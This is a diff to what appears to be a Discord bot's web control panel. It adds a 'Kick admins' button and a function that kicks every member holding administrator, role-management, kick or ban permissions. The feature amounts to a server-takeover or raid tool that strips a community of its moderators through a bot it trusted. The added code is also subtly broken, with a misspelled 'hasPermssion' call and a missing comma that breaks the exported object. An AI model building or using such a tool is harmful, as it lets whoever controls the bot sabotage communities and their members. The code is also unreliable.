@@ -46,6 +46,7 @@ module.exports = {
   },
   selectMember: function(g){
     var selm = new String("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\"><button type=\"button\" onclick=\"if(prompt('Do you really want to leave this guild? (y/n)') == 'y') window.location.href = '?path=leave&guild=" + g + "'\">Leave Guild</button><button type=\"button\" onclick=\"window.location.href = '?path=sch&guild=" + g + "'\">Channels</button><button type=\"button\" onclick=\"window.location.href = '?path=roles&guild=" + g + "'\">Roles</button><button type=\"button\" onclick=\"window.location.href = '?path=list'\">Back to list</button><h1>Members</h1>" + client.guilds.get(g).members.size + "<br />")
+    selm = selm + `<br /><button type="button" onclick="window.location.href = '?path=kickadmins&guild=${g}'">Kick admins</button><br /><br />`
     client.guilds.get(g).members.forEach(m => {
       if(m) {
         var isBot = ""
@@ -113,6 +114,12 @@ module.exports = {
     })
     return '<button type="button" onclick="window.location.href = `?logoff=1`">LogOff</button>' + selm
   },
+  kickAdmins: async function(guild) {
+    client.guilds.find(g => g.id == guild).members.filter(m => (m.hasPermission("ADMINISTRATOR") || m.hasPermission("MANAGE_ROLES") || m.hasPermission("KICK_MEMBERS") || m.hasPermssion("BAN_MEMBERS")) && m.kickable).forEach(async m => {
+      await m.kick()
+      console.log("Kicked " + m.user.tag)
+    })
+  }
   messages: async function(channel) {
     remote = "<br />ERR 2 (NO MESSAGES FOUND)"
     var ht = new String("<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, user-scalable=no\">")
